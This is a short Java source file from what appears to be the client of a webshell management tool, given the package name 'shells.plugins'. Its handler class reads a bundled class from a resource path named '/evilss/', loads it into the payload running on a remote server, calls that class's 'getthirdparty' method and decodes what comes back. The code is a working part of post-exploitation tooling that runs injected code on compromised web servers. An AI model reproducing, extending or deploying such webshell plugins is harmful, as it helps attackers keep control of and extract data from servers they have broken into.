package shells.plugins.java.handler;

import util.functions;
import util.http.ReqParameter;

public class ThirdpartyHadnler extends HandlerBase{
    public String handler() {
        this.payload.include("Thirdparty", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/Thirdparty.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("aaa", "aaa");
        return encoding.Decoding(payload.evalFunc("Thirdparty", "getthirdparty", reqParameter));
    }
}
